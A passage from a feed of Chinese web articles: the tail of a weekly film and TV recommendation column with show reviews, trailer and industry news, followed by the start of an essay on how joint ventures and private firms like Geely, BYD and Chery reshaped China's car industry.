href=\"https://movie.douban.com/subject/35413040/\">豆瓣链接</a></p>\n<blockquote><p>你这个长相亲切、嘴上无门、用力生活的人，怎么让人有点喜欢……</p></blockquote>\n<p>@宽治：时隔一年多，《奥卡菲娜是来自皇后区的诺拉》终于迎来了第二季，主角还是由多才多艺的奥卡菲娜所扮演的那个人前「社牛」、人后「敏感」的亚裔女孩诺拉。作为一部情景喜剧，这部剧在故事方面没有设计太多细节，也有不少脸谱化的呈现，但好在表演还算自然，呈现的笑料也不少。我认为这部作品至少在两个层面上带来一些新鲜的视角。第一是把故事设定在纽约以人口多元著称的皇后区，而不是人们更熟悉的曼哈顿或者布鲁克林，也正是这个原因，这部剧里的纽约才显得不那么「纽约」，但却可能更接近现实。第二是呈现了一个不太一样的亚裔形象。这当然与奥卡菲娜本人鲜明的个性有关，所以才会有人认为这部剧带有半自传的性质。但我自己更看重的则是主创如何在看似怪异、夸张的桥段中，找回关于人的一些真实。虽然这很容易就会落入俗套，但剧中那种若有似无的悲剧情绪却也缓解了时而煽情的尴尬。</p>\n<h3>[美剧] 致命点击</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/10/article/7adcf8ef21309121d1876e6eb5f23525\"></figure><p>关键词：悬疑 / 惊悚 / 犯罪</p>\n<p>片长：45 分钟（单集）× 8 集</p>\n<p>观看渠道：<a href=\"https://www.netflix.com/title/80991754\">Netflix</a>；<a href=\"https://movie.douban.com/subject/34805719/\">豆瓣链接</a></p>\n<blockquote><p>如果点击观看的次数达到了五百万，我会去死。</p></blockquote>\n<p>@潘誉晗：剧情讲述网上出现了一个男子手举「我虐待过女性」牌子的视频，并表示如果这段影片的观看次数达到了 500 万次，他就会死去。皮娅认出了视频中的男子是她的哥哥尼克，联系家人无果后和嫂子一起前往警局报案，而这时，新出现的视频也释放出了更多的信息——尼克宣称自己杀死过一位女性。皮娅不相信众人心中温柔善良的哥哥会有这般行为，与此同时，点击观看视频的人数越来越多，而且真的达到了 500 万次……</p>\n<p>「标题党」这个翻译似乎更适合这部剧，尤其是现在这个社交网络时代，有多少人也和剧集中的平常人一样，经常因为标题或者信息过于轰动就被误导，影射了社交媒体上还未了解真相就匆忙站队、转发的人。事实在揭露之前我们真的无法判断结果如何，就好像尼克的过往被一点点揭晓的时候，大家才发现，原来他们没有真正地了解身边的这个朋友，缺少自我思考的盲目跟从绝不是一件纯粹的好事，也许，你的每一次点击都会造成致命的后果。</p>\n<h3>[动画] 爱与演唱会!超级明星!! / Love Live! Superstar!!</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/10/article/b1978ff3d08a9280455e5fe9977cf375\"></figure><p>关键词：剧情 / 音乐 / 校园</p>\n<p>片长：24 分钟（单集）× 12 集，每周日更新</p>\n<p>观看渠道：<a href=\"https://www.youtube.com/playlist?list=PL12UaAf_xzfrCAOTroy2IhYeGg7mYc6wO\">YouTube</a> / <a href=\"https://www.bilibili.com/bangumi/media/md28234693/\">哔哩哔哩</a>（有删改，不定期更新）；<a href=\"https://movie.douban.com/subject/35073328/\">豆瓣链接</a></p>\n<blockquote><p>你好谢谢蒸羊羔蒸熊掌蒸鹿尾儿烧花鸭烧雏鸡烧子鹅再见！</p></blockquote>\n<p>@SHY：略显离经叛道的《<a href=\"https://movie.douban.com/subject/34929950/\">虹咲学园学园偶像同好会</a>》后，系列正统续作《Love Live! Superstar!!》又回到了我们熟悉的花田三板斧套路上。地点是私立结之丘女子高等学校，继承已废止的神宫音乐学校，这所新设立的高中今年迎来了第一批学生。最喜欢唱歌、梦想考入音乐科的涩谷香音，总在关键场合紧张失声，无法在众人面前展现自己的歌喉，落榜进入普通科就读。本想就此放弃歌唱的她，无意间哼出的小调却吸引了上海留学生唐可可的注意，被对方邀请成为「学园偶像」。突破重重障碍，展翅飞向远方，拥有共同梦想的五位少女集结于此，「大家一起实现的故事」，再度绽放光芒。</p>\n<p>核心成员数量从九人缩减到五人后，《Love Live! Superstar!!》显然拥有更多篇幅塑造每位主角。最能体现这一点的，是前三集的编排，本作没有急于扩充队伍，而是围绕香音与可可两人展开剧情。从一开始的迟疑到勉强接受，为了得到认可而努力，两颗心逐渐贴近，克服心理问题，终于站在舞台上，完成了约定好的「最棒的 Live」。整段剧情如水到渠成，情感铺垫到位，角色形象鲜明。遗憾的是，小高潮后，叙事步调加快，部分转折的观感有些割裂，在第六集中更为显著。不过，本作的制作质量仍不失《Love Live!》正作水准，加上明快的背景美术与斋藤敦史的人设，为系列注入了一丝新意。</p>\n<h3>[美剧] 美国犯罪故事 第三季：弹劾克林顿</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/10/article/afd82f0aedf0c3572ab880dd9a9c8972\"></figure><p>关键词：剧情 / 传记 / 犯罪</p>\n<p>片长：60 分钟（单集）× 10 集；<a href=\"https://movie.douban.com/subject/26762920/\">豆瓣链接</a></p>\n<blockquote><p>This isn't about justice.（这不仅仅是关系正义。）</p></blockquote>\n<p>@潘誉晗：《美国犯罪故事》是由 FX 电视台出品，著名导演瑞恩·墨菲执导的系列剧集，每一季关注的都是历史上发生过的真实事件，例如第一季的「辛普森杀妻案」，第二季的「大设计师范思哲被杀案」，而这一季则围绕大名鼎鼎的美国前总统比尔·克林顿因出轨被弹劾展开。</p>\n<p>克林顿和莱温斯基的这段风流韵事太过著名，因而导演选用了另一角度去诠释这个故事——将切入点放在另一个关键人物琳达·特里普身上。因为被降职，心怀不甘的琳达故意接近莱温斯基，以所谓「闺蜜」的身份发现了这场性丑闻之后，立刻曝光。在这段故事中我们可以看到，不光是莱温斯基，花名在外的克林顿甚至在州长时期就有过利用职权进行职场骚扰的事情。</p>\n<p>本剧全新的演绎挖掘出了一个全新的、值得探讨的点，那就是女性在职场上为了自己的梦想奋斗的时候，如果高职位的男性对你抛出性暗示，你是选择为了工作默默接受、闭口不语，还是选择勇敢地站出来？这一点的确很值得大家观看和讨论。</p>\n<h3>更多</h3>\n<p><a href=\"https://movie.douban.com/subject/35358715/\">[纪录片] 里克·斯坦的康沃尔之旅</a> @利兹与青鸟：里克·斯坦的旅行纪录片又出新系列！这次他来到了对他自己意义非凡的海边度假圣地——位于英格兰西南端魔法世界般的康沃尔。这里有蜿蜒曲折的海岸线、悬崖、沙滩、美味的海鲜料理，还有许多艺术家的小说、画作，甚至影视作品都源自于此。里克·斯坦在这里度过了童年的一个个暑假，影片不仅为观众呈现他眼中的康沃尔，还探访了当地艺术家、农民、居民，发掘有趣的历史故事和独具一格的风土人情。</p>\n<p><a href=\"https://movie.douban.com/subject/35516854/\">[动画] 宝可梦 我变成了耿鬼！？</a> @SHY：学校里流传着「七大不可思议」，其中之一是登上阳光无法直射的最后一级台阶，就会被拖入黑暗，变成幽灵。不善言辞的翔子阴差阳错之下，被同学推上楼梯，然后……变成了耿鬼！？就这样，她和其它黑暗中的宝可梦一起度过了奇妙的一天，探索校园怪谈的真相，还齐心协力救下伙伴。依然出自《破晓之翼》团队，这则妙趣横生的短篇动画值得一看。</p>\n<h2>📅 本周新预告</h2>\n<h3>《黑客帝国：矩阵重启》公布首支正式预告，12 月上映</h3> <p>9 月 9 日，华纳兄弟公布了电影《黑客帝国：矩阵重启》（暂译）的首支正式预告，将于 12 月 22 日同步登陆北美院线及 HBO Max 流媒体平台。本作系《黑客帝国 3：矩阵革命》的续集，由拉娜·沃卓斯基执导，与亚历山大·赫蒙、大卫·米切尔共同撰写剧本，基努·里维斯、凯瑞-安·莫斯等主演。</p>\n<h3>「小李子」主演，《不要抬头》12 月 24 日登陆 Netflix</h3> <p>9 月 8 日，由亚当·麦凯自编自导，莱昂纳多·迪卡普里奥、詹妮弗·劳伦斯、蒂莫西·柴勒梅德、克里斯·埃文斯、凯特·布兰切特、梅丽尔·斯特里普、爱莉安娜·格兰德、乔纳·希尔等全明星主演的新片《不要抬头》首曝预告。该片将于 12 月 10 日在北美部分影院上映，并将于 12 月 24 日登陆 Netflix。</p>\n<h3>恐怖惊悚片《Soho 区惊魂夜》发布中文预告，10 月 29 日北美上映</h3> <p>安雅·泰勒-乔伊主演的恐怖惊悚片《Soho 区惊魂夜》发布中文预告，将于 10 月 29 日北美上映。影片由埃德加·赖特导演，赖特和 Krysty Wilson-Cairns（《低俗怪谈》）编剧，讲述两个穿越时间的女子在六十年代伦敦 soho 的惊魂故事。</p>\n<h3>更多</h3>\n<p><a href=\"https://www.bilibili.com/video/BV1Sq4y1U7H7\" target=\"_blank\"><strong>凯文·科斯特纳主演高分剧集《黄石》第 4 季发布预告：</strong></a>凯文·科斯特纳主演高分剧集《黄石》第 4 季发布正式预告，宣布 11 月 07 日开播，本季共 10 集。</p>\n<p><a href=\"https://www.bilibili.com/video/BV1Uf4y1J72E?from=search&amp;seid=15324135785861587943&amp;spm_id_from=333.337.0.0\" target=\"_blank\"><strong>娄烨执导，巩俐主演新片《兰心大剧院》10 月 15 日全国上映：</strong></a>由娄烨执导，巩俐、赵又廷主演，小田切让、帕斯卡·格里高利、汤姆·拉斯齐哈、黄湘丽、中岛步、王传君、张颂文联合主演的《兰心大剧院》定档 10 月 15 日，并发布特别视频。该片也将作为第十一届北京国际电影节闭幕影片进行放映。</p>\n<p><a href=\"https://www.bilibili.com/video/BV1CA411F7nK?from=search&amp;seid=18215470000050849331&amp;spm_id_from=333.337.0.0\" target=\"_blank\"><strong>动画电影《天赐灵机》正式预告：</strong></a>《天赐灵机》发布正式预告，讲述有着社交障碍的中学生巴尼，与他的机器人好朋友罗恩之间发生的可爱故事，将于 10 月 22 日北美上映。</p>\n<p><a href=\"https://www.bilibili.com/video/BV17f4y1P7mk?from=search&amp;seid=2467741794293790488&amp;spm_id_from=333.337.0.0\" target=\"_blank\"><strong>哥特喜剧动画电影《亚当斯一家 2》发布预告，北美 10 月 1 日上映：</strong></a>哥特喜剧动画电影《亚当斯一家 2》发布中字预告，本片由奥斯卡·伊萨克，查理兹·塞隆、科洛·莫瑞兹、尼克·克罗尔、贝特·迈德尔等参与配音，将于 10 月 1 日北美上映并将同步线上实行付费点播。</p>\n<p><a href=\"https://www.bilibili.com/video/BV1Ch411H7Ev?from=search&amp;seid=5788695070428292847&amp;spm_id_from=333.337.0.0\" target=\"_blank\"><strong>本·阿弗莱克和马特·达蒙新作《最后的决斗》：</strong></a>由雷德利·斯科特执导， 本·阿弗莱克和马特·达蒙等编剧并出演的新片《最后的决斗》发布电视预告，该片讲述一名十四世纪的法国骑士为了捍卫妻子的荣誉，与一名地主决斗的故事，将于 10 月 15 日北美上映。</p>\n<p><a href=\"https://weibo.com/tv/show/1034:4679278797979730\" target=\"_blank\"><strong>里兹·阿迈德主演的科幻新片《遇见》：</strong></a>里兹·阿迈德主演的科幻新片《遇见》发布先导预告，该片将于 12 月 3 日北美上映，12 月 10 日登陆亚马逊。该片讲述前军陆战队员马利克·卡恩确信，寄生虫已入侵地球，并且能控制人类宿主。他想尽一切办法，保护两个儿子。</p>\n<p><a href=\"https://www.bilibili.com/video/BV1Jv411w7qc\" target=\"_blank\"><strong>华金·菲尼克斯主演 A24 新片《呼朋引伴》：</strong></a>首爆预告，宣布影片将于今年 11 月在北美上映。影片由迈克·米尔斯（《二十世纪女人》）执导，讲述由菲尼克斯饰演一名纪录片制作人，因弟弟患有严重抑郁症没法照顾儿子，他便带着侄子踏上了一段跨国旅程。该片已在特柳赖德电影节首映，还将参与纽约电影节。</p>\n<p><a href=\"https://www.bilibili.com/video/BV1AL4y1a7KN\" target=\"_blank\"><strong>漫改 TV 动画《极主夫道 Part 2》：</strong></a>改编自おおのこうすけ的同名漫画，今千秋执导，J.C.STAFF 制作，讲述曾为极道的不死身阿龙的主夫生活，10 月 7 日独家上线 Netflix。</p>\n<h2>📽 影视新闻周报</h2>\n<h3>郑渊洁同名作品改编电影《皮皮鲁与鲁西西之罐头小人》定档 9 月 30 日上映</h3>\n<p>由童话大王郑渊洁同名作品改编的电影《皮皮鲁与鲁西西之罐头小人》发布海报和 <a href=\"https://weibo.com/tv/show/1034:4677412508860482\" target=\"_blank\">新预告</a>，将在 9 月 30 日全国上映。新预告中还贴出「请在未成年陪同下观看」的可爱提示，请大朋友和小朋友们一起观影。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/10/article/e1aff958618fc77b8a0acdd22bb523a7\"></figure><h3>《海贼王》真人剧集将登陆 Netflix</h3>\n<p>9 月 3 日，Netflix 宣布推出《海贼王》真人美剧，并公布了 Logo 和首集编剧阵容，具体上线时间待定。本作改编自尾田荣一郎的同名漫画，马提·阿德尔斯坦、贝基·克莱门茨担任制片人，麦特·欧文斯、史蒂芬·前田等编剧，第一季共 10 集，由「东海篇」开始。 <a href=\"https://twitter.com/onepiecenetflix/status/1433792121622851596\" target=\"_blank\">来源</a></p>\n<h3>漫改 TV 动画《鬼灭之刃 花街篇》将于秋冬之际播出</h3>\n<p>9 月 6 日，富士电视台宣布 TV 动画《鬼灭之刃 花街篇》定档今秋和今冬，东京时间每周日晚 11 点 15 分播出，具体开播时间将于 9 月 25 日公布。本作改编自吾峠呼世晴的同名漫画，承接 TV 动画第一季《灶门炭治郎 立志篇》和动画电影《无限列车篇》，讲述炭治郎一行在花街的遭遇。 <a href=\"https://twitter.com/kimetsu_off/status/1434720951514505217\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/10/10ababe91ab55045c930caf6639cc913.png\"></figure><h3>《黑道家族》前传电影《纽瓦克众圣》10 月 1 日登陆北美院线及 HBO Max</h3>\n<p>9 月 9 日，《黑道家族》前传电影《纽瓦克众圣》发布全新海报。该片由亚历桑德罗·尼沃拉、小莱斯利·奥多姆、乔·博恩瑟、维拉·法米加等主演，将于 10 月 1 日登陆北美院线及 HBO Max。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/10/article/f8bbfe993e4a45863de02f689ca75cde\"></figure><h3>更多</h3>\n<p><strong>漫改 TV 动画《风都侦探》2022 年夏季播出：</strong>TV 动画《风都侦探》公布了印象图与主创阵容，椛岛洋介执导，樋口达人编剧、系构，STUDIO KAI 制作，2022 年夏季开始播出。本作改编自三条陆编剧、佐藤正基作画的同名漫画，系特摄剧集《假面骑士 W》的正统续作，讲述翔太郎与菲利普等人的全新战斗。 <a href=\"https://www.kamen-rider-official.com/kr50th/fuuto#article-210906\" target=\"_blank\">来源</a></p>\n<p><strong>吴海涛导演的西游动画电影《大圣降妖》定档 10 月 1 日：</strong>电影在火云洞章节基础上进行改编，讲述生性顽劣，心底纯真的红孩儿为了给父母做一顿团圆饭，被黑云仙蛊惑设计捉唐僧的故事。</p>\n<p><strong>《长安十二时辰》团队新片《敦煌：归义英雄》正式获准拍摄：</strong>影片由《长安十二时辰》导演曹盾执导，马伯庸编剧。讲述在唐德宗贞元四年(公元788年)，大唐在西域最后一个据点就此失去。汉民张议潮传承着当年大唐的荣光。他秘密招募、训练义军，不断收纳反抗吐蕃起义被镇压后的流亡者，蓄积力量，准备把沙洲夺回来，送归大唐。</p>\n<p><strong>漫改 TV 动画《舞动不止》：</strong>改编自 GEORGE 朝仓的同名漫画，境宗久执导，成田良美系构，MAPPA 制作，讲述男主人公村尾润平追寻芭蕾梦想的故事，2022 年开始播出。 <a href=\"https://twitter.com/MAPPA_Info/status/1435438872511401987\" target=\"_blank\">来源</a></p>\n<p><strong>《孤儿怨：首杀》：</strong>Paramount Players 拿下著名恐怖片《孤儿怨》的前传电影《孤儿怨：首杀》北美发行权，影片暂未定档。</p>\n<p><strong>《月光光心慌慌》系列新片：</strong>恐怖片《月光光心慌慌》系列新片《万圣节杀戮》将于 10 月 15 日 北美上映，同步流媒体 Peacock 上线。</p>\n<h2>🎪 彩蛋</h2>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/10/4d0f0876c2e0cff3b353aa649a779f3c.jpg\"></figure><p>本期的彩蛋是由中奖读者 <a class=\"ss-atUser\" data-mention=\"@AndrewYan\" user-id=\"c4p00h5b34t82dsrfpb0\" href=\"https://sspai.com/u/AndrewYan\">@AndrewYan</a> 提供的「看图猜电影」，首位猜中片名的读者，可获得彩蛋提供名额 1 次（彩蛋内容包括但不限于「猜电影」「你喜欢的经典影视作品/影人/台词」「电影冷知识」），和我们不定期发放的奖品。感谢大家的积极参与！本期彩蛋的答案是杨德昌导演的电影《一一 (2000)》，抢答第一名的读者是 <a class=\"ss-atUser\" data-mention=\"@大头Evin\" user-id=\"bs2pbbtb34tcs0pncn60\" href=\"https://sspai.com/u/alliswell\">@大头Evin</a>，恭喜 TA 获得 1 次「看什么彩蛋」提供机会！请这位朋友注意查看站内私信~☆</p>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现🚀</p>\n","link":"https://sspai.com/post/68692"},{"title":"跨界融合 汽车业的涅槃（上）","date":"2021-09-10 09:39:56","description":"\n<p>什么是界？新华字典的解释是：两个地区分界的线；什么是行业的界？一位专家的解释是：专业或资本、技术、自然垄断形成的门槛；什么是汽车行业的界？一位车企老领导称：以内燃机为主要动力的传统汽车产业形成的产业链。在中国，还有一条制度划出的界：行业的管理体制、监管体制、准入和退出等机制形成的界。</p>\n<p>如今，随着一批批“造车新力量”的大举侵入，中国传统汽车行业正在经历一场前所未有的熬炼，是蜕一层皮还是凤凰涅槃，已经不是这个行业自身能决定的事情。对这一巨变，外界给了一个温柔美丽的词：跨界融合。殊不知，这种跨界之后的融合，会革了传统汽车行业的命。</p>\n<p>为什么这么说？</p>\n<h2><b>跨界融合 撼动了传统汽车业的根基</b></h2>\n<p>1885年，德国人卡尔·奔驰造出世界上第一辆以汽油为动力的三轮汽车,并于次年申请了发明专利。这一天是世界汽车诞生日。</p>\n<p>1894年，法国人路易斯·潘哈德和埃米尔·拉瓦索尔合作，发明了手动变速器。从那一年起，汽车才能够进退自如、快慢如意地行驶了。</p>\n<p>1913年，美国人亨利·福特发明了汽车制造流水线，使生产效率大幅提高，制造成本大幅下降。从那一年起，汽车成了人民大众买得起的车。</p>\n<p>136年来，发动机、变速器、生产流水线，一直是汽车最核心的技术和生产方式，虽经无数次迭代升级，却始终是外部势力难以逾越的深沟高垒。如果不是1971年的石油危机，丰田乘机以小型化、轻量化、节能的优势挤进来，世界汽车市场仍将是奔驰、宝马、通用、福特、雪铁龙们的天下；如果不是1986年的改革开放，北京吉普、上汽大众、广汽丰田、重庆长安、保定长城、浙江吉利们应运而生，中国汽车市场仍将是一汽解放、二汽东风、北京越野、上海轿车的天下。如果还是以石油为动力源，特斯拉、蔚来们绝不可能成功立足汽车业，世界与中国汽车格局的楚河汉界仍然是一如既往地固若金汤。</p>\n<p>能源革命革了发动机、变速器的命，突破了岿然不动的汽车行业技术壁垒，动摇了传统汽车赖以生存的根基。碳减排、碳达峰的进一步加持，加速了汽车行业跨界融合的进程。</p>\n<h2><b>轿车进家庭 掀起中国跨界造车第一浪</b></h2>\n<p>许多人都认为跨界造车始于今天，但上世纪八十年代我国汽车业的边界就被突破了，而且是两股力量分别从纵向和侧向的突破。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<h2><b>第一股力量 外企带来合资潮</b></h2>\n<p>改革开放之前，汽车作为生产资料实行国家计划调拨制度，没有现代意义上的汽车工业，没有汽车市场，也没有私人汽车。从1949年建国到1978年的49年间，全国累计生产汽车140.16万辆，其中轿车1.49万辆。汽车工业的状况是缺重、少轻，轿车基本空白，没钱、没技术，仅有的几款车型还是20年一贯制。</p>\n<p>1982年，改革开放的总设计师邓小平批示“轿车可以合资”。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-8a50f41ae3f72b1c911b60b48ee348f1_b.jpg\" data-size=\"normal\" data-rawwidth=\"831\" data-rawheight=\"534\" class=\"origin_image zh-lightbox-thumb\" width=\"831\" data-original=\"https://pic2.zhimg.com/v2-8a50f41ae3f72b1c911b60b48ee348f1_r.jpg\"><figcaption>北京吉普汽车公司</figcaption></figure><p class=\"ztext-empty-paragraph\"><br></p>\n<p>1984年1月，北京吉普汽车公司开业。1984年10月10日，上汽大众合资签字仪式在人民大会堂举行。1985年广州标致汽车成立。这是我国最早成立的三家中外合资汽车企业。后来又有了一汽大众、神龙富康、上汽通用、广州本田等一批合资企业。</p>\n<p>合资的初衷是利用外资引进技术发展自主。那时，中国汽车工业太需要发达国家成熟的技术和资金的支持。</p>\n<p>中国汽车工业太落后了。</p>\n<p>合资前，北京吉普母公司北京汽车制造厂年产北京BJ212越野车15000辆。上汽大众母公司上海汽车厂最高年产上海牌轿车5000辆。</p>\n<p>合资前，美国专家来北汽考察，北汽拿出了BJ 212。美国专家拆检后说，这款车的发动机、变速箱和大部分总成来自1937年的福特汽车。原来，苏联曾从福特引进技术，1956年推出伏尔加牌轿车。1959年北汽获得伏尔加图纸，1964年推出了BJ 212。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-c63db93d6fc86f2f4a7429ce0b9730ea_b.jpg\" data-size=\"normal\" data-rawwidth=\"831\" data-rawheight=\"554\" class=\"origin_image zh-lightbox-thumb\" width=\"831\" data-original=\"https://pic3.zhimg.com/v2-c63db93d6fc86f2f4a7429ce0b9730ea_r.jpg\"><figcaption>北汽BJ212（网络图片）</figcaption></figure><p class=\"ztext-empty-paragraph\"><br></p>\n<p>合资前，上海汽车厂为尽快掌握桑塔纳轿车的装配制造工艺，在原上海牌轿车拼装车间里圈出一块空地组装桑塔纳。当习惯用榔头敲轿车的工人从包装木箱中取出桑塔纳“白车身”（车身外壳）时都惊呆了，怎么德国车不用“敲”，“拼”起来就行？</p>\n<p>这是两位亲历者的回忆。</p>\n<p>外企带着世界先进的汽车技术、工艺、生产方式、管理方式进入中国，中国汽车工业落后的面貌迅速改观。2010年，中国以1380万辆的销量，超过美国成为世界最大的汽车市场。</p>\n<p>这是成熟的汽车社会对尚未开发的汽车社会的跨界，这是先进的汽车生产方式对落后的汽车生产方式的改造，这是先进的汽车发展理念对落后的汽车发展理念的融合。</p>\n<p>但，这种跨界是单向的，这种改造是降维式的，被融合的主体是中方。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<h2><b>第二股力量 民企带来“鲶鱼效应”</b></h2>\n<p>李书福是汽车圈儿都熟悉的人。</p>\n<p>上世纪90年代末那几年，李书福利用一切机会游说他能见到的国家部委官员，甚至游说到了国家计委主任曾培炎面前。他说得最多的两句话是：“轿车是什么？就是四个轮子+几个沙发+一个壳子！”，“我花自己的钱圆中国人的轿车梦，失败的结果由我自己承担，就请给我一次失败的机会吧。”</p>\n<p>那时，李书福30多岁，但已是小有名气的农民企业家。他开过照相馆、造过电冰箱、办过铝塑板厂、产过摩托车，而且干什么成什么。1996年，吉利摩托车产销达到20万辆，畅销30多个国家和地区。但他一门心思想的是轿车，可那时国家对汽车实行严格的准入制度，，只允许“三大（一汽、东风、上汽）三小（北京吉普、天津夏利、广州标致）”生产轿车。</p>\n<p>他是个局外人。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-456de5a71dd3133fc2aacd88c2b7799b_b.jpg\" data-size=\"normal\" data-rawwidth=\"831\" data-rawheight=\"437\" class=\"origin_image zh-lightbox-thumb\" width=\"831\" data-original=\"https://pic4.zhimg.com/v2-456de5a71dd3133fc2aacd88c2b7799b_r.jpg\"><figcaption>吉利集团总部原址</figcaption></figure><p class=\"ztext-empty-paragraph\"><br></p>\n<p>干摩托车是他接近汽车的迂回之路。他在浙江临海经济技术开发区买了一块850亩的地，名义上是生产摩托车，可建成的是“吉利豪情汽车工业园”。他收购了四川德阳监狱一家汽车厂，那家厂只有客车生产资质。1998年8月8日，第一辆吉利轿车下线（那时不敢叫轿车），但只能在省内销售、上牌、行驶。2001年11月，吉利汽车终于登上汽车生产企业产品目录，成为中国首家获得轿车生产资质的民营企业。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-2ecc4c7b12e763fd02293b2daa136bb4_b.jpg\" data-size=\"normal\" data-rawwidth=\"831\" data-rawheight=\"648\" class=\"origin_image zh-lightbox-thumb\" width=\"831\" data-original=\"https://pic1.zhimg.com/v2-2ecc4c7b12e763fd02293b2daa136bb4_r.jpg\"><figcaption>1998年8月8日，吉利首款豪情轿车下线</figcaption></figure><p class=\"ztext-empty-paragraph\"><br></p>\n<p>与吉利造车之路同样曲折的还有比亚迪和奇瑞。</p>\n<p>比亚迪的掌门人是王传福。他本有一份让人艳羡的工作：北京有色金属研究院301室副主任，26岁，当时全国最年轻的处长。次年他又成为研究院下设比格电池有限公司总经理，但两年后他辞职下海了。</p>\n<p>他带领20多人创立了比亚迪科技有限公司，生产笔记本电脑和手机用电池。到2010年，比亚迪排名镍镉电池全球第一，镍氢电池第二，锂电池第三，成为世界知名的“电池大王”。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-c04f41b6a2f0b7a15a58d92531c20bab_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1\" data-rawheight=\"1\" class=\"content_image\" width=\"1\"></figure><figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-96a0ca45df663729ea1cf193bb3c12eb_b.jpg\" data-size=\"normal\" data-rawwidth=\"831\" data-rawheight=\"487\" class=\"origin_image zh-lightbox-thumb\" width=\"831\" data-original=\"https://pic4.zhimg.com/v2-96a0ca45df663729ea1cf193bb3c12eb_r.jpg\"><figcaption>比亚迪收购西安秦川汽车有限责任公司</figcaption></figure><p class=\"ztext-empty-paragraph\"><br></p>\n<p>他不满足。2003年1月23日，比亚迪收购了连年亏损的西安秦川汽车有限责任公司77％的股份，成为继吉利之后第二家民营轿车生产企业。如今，他又成了世界闻名的“电动汽车大王”。</p>\n<p>奇瑞跨进汽车业更经历了一波神操作。</p>\n<p>奇瑞原本是安徽省芜湖市政府的汽车项目。那时地方干汽车的积极性都很高，但由于无权批准轿车项目，所以奇瑞有个内部代号“951工程”（“九五”期间安徽省1号工程），对外公开的名称叫“安徽汽车零部件工业公司”。</p>\n<p>芜湖市政府挖来安徽老乡、一汽“十大杰出青年”尹同耀（现名尹同跃）。奇瑞于1997年3月在芜湖经济开发区动工，那年尹同耀35岁。1999年，奇瑞轿车下线，同吉利一样，只能在本省卖、本省开。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-8d5839c93b61a7752c2225285cbfacd1_b.jpg\" data-size=\"normal\" data-rawwidth=\"831\" data-rawheight=\"499\" class=\"origin_image zh-lightbox-thumb\" width=\"831\" data-original=\"https://pic2.zhimg.com/v2-8d5839c93b61a7752c2225285cbfacd1_r.jpg\"><figcaption>1999年12月18日，首款奇瑞风云轿车下线</figcaption></figure><p class=\"ztext-empty-paragraph\"><br></p>\n<p>2000年底，在有关政府部门运作下，奇瑞与上汽签了一份合资协议。奇瑞将20%股权无偿划拨给上汽，成为上汽子公司。上汽对奇瑞不投资、不参与管理、不承担债务、不分红。4年后，双方友好分手，上汽又将20%股份无偿划归奇瑞，轿车生产资质也留在了奇瑞。</p>\n<p>当时还有几家军转民企业获得轿车或微型车生产资质：贵航云雀、哈飞汽车、昌河汽车、重庆长安、陕西秦川……，长城、中兴等一批民营企业也诞生在那个年代。</p>\n<h2><b>摸着石头过河 第一波跨界造车的经验小结</b></h2>\n<p>外资进入、民企加盟、引进消化吸收先进技术，使包括商用车在内的中国汽车行业迅速壮大起来，掌握了发动机、变速器等关键技术，装备了世界上最先进的生产流水线，形成了完整的零部件配套产业链。拉动了上游的钢铁、石油、化工、橡胶、玻璃产业。促进了下游的公共交通、客货运输、城市化建设、乡村居民出行。建成了世界最大的汽车市场、最长的国家公路网、最庞大的物流体系，出现了世界上最拥挤的节假日驾车出行场景。</p>\n<p>也种下了苦果。那就是未能兑现当初“以市场换技术”的设想。我们吃了亏。</p>\n<p>据说，当年桑塔纳轿车停产时，上汽曾恳请大众将桑塔纳轿车技术转让给自己，但德国人没有同意。最后上汽通过收购英国罗浮汽车，拿到罗浮汽车的发动机、变速器、底盘等技术，才有了自主品牌荣威、MG的诞生。</p>\n<p>同样的遭遇也发生在一汽、东风、北汽、广汽、长安、华晨这些合资中方企业身上，这些企业采取将派入合资企业的中方技术、管理干部轮岗回自主企业的办法，将外方的技术、工艺流程、管理经验移植到自主企业，取得了很好成效。民企也从合资企业挖了不少人。</p>\n<p>合资没能让中方的自主品牌强起来，这一弱势一直延续至今。倒是没有合资门路的比亚迪、长城、吉利、奇瑞们，依靠自力更生的精神闯出了一条自主品牌的成功之路。</p>\n<p>这里有历史的原因。</p>\n<p>当初的合资，我们一穷二白，没有资金、没有技术、没有经验，只能把最好的厂房、最好的设备、最好的干部、最好的工人投入进去，剩下的家底在很长时间内失去了造血和再生功能。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-5b5089543763760a398d10f4087435d8_b.jpg\" data-size=\"normal\" data-rawwidth=\"831\" data-rawheight=\"577\" class=\"origin_image zh-lightbox-thumb\" width=\"831\" data-original=\"https://pic1.zhimg.com/v2-5b5089543763760a398d10f4087435d8_r.jpg\"><figcaption>1983年5月5日，北京市汽车工业总公司经理吴忠良，美国汽车公司董事长兼最高执行官铁伯特签署北京吉普汽车有限公司合资经营总合同及章程</figcaption></figure><p 